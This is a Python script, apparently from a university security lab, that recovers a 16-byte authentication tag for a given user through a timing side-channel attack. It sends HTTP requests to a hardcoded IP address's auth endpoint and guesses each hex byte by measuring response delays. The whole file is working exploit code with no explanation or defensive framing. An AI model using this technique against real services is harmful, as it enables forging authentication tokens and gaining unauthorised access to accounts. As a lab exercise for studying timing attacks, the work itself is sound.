import requests

def buildTag(tags):
    resultTag = ""
    for tag in tags:
        resultTag += tag
    return resultTag

def testTag(tag):
    totUrl = url + tag
    result = requests.get(totUrl).elapsed.total_seconds()
    print("The Time :" + str(result) + " for tag : " + tag)
    return result

delay = "100"
delayInt = 0.100
user = "joarkarl100"
url = "http://130.243.27.198/auth/" + delay + "/" + user + "/"

startTag = "00000000000000000000000000000000"
firstTime = requests.get(url + "startTag").elapsed.total_seconds()
print("First Time with all zeros = " + str(firstTime))

tags = ["00" for x in range(16)]
tempTags = ["00" for x in range(16)]

lastTime = testTag(buildTag(tempTags))
prevTag = "00"

for x in range(16):
    found = 0
    #lägg in här, test om det är 00
    for i in range(0,16):
        #lastTime = testTag(buildTag(tags))
        for j in range(0,16):
            if found == 0:
                partOfTag = (hex(i)[2] + hex(j)[2])
                tempTags[x] = partOfTag
                thisTime = testTag(buildTag(tempTags))

                if thisTime > (delayInt * (x + 1)):
                    print ("Found " + partOfTag + " as index " + str(x) + " of tag")
                    found = 1
                    tags[x] = partOfTag
                else :
                    prevTag = partOfTag
                    lastTime = thisTime
                    

print("    ") 
print("    ")        
print(buildTag(tags))
print("done 😀")